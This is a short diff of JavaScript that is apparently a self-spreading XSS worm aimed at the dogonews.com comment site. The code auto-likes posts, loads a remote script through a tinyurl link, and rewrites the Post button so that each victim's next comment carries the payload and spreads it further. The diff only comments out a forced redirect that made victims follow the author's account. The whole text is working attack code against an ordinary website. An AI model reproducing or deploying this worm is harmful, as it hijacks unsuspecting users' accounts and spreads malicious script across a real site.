@@ -7,7 +7,7 @@ window.onload = function(){ //Fix autolike
 //$(".xss").parent().parent().find('.footer').first().find('button.like.btn').first().click(); //Auto Like!
 $(".xss").parent().parent().find('.footer').find('button.like.btn').click(); //Autolike Everything
 var p='<script src="https://tinyurl.com/j39dsb4" class="xss">run()</script>'; //Assign Payload into var for further spread
-window.location = 'https://www.dogonews.com/i/imarebel/follow'; //Just incase user is not folowing me  :D
+//window.location = 'https://www.dogonews.com/i/imarebel/follow'; //Just incase user is not folowing me  :D
 $('input[value$=Post]').first().attr('type','button').attr('onclick','var k=$(\'textarea#comment_body.text.required.form-control\').first();var f=k.val();k.val(f+p);k.parent().parent().parent().submit();'); //Automatic Inject to next comment
   console.log("XSS @ComputerCandyYT on Twitter")
 }
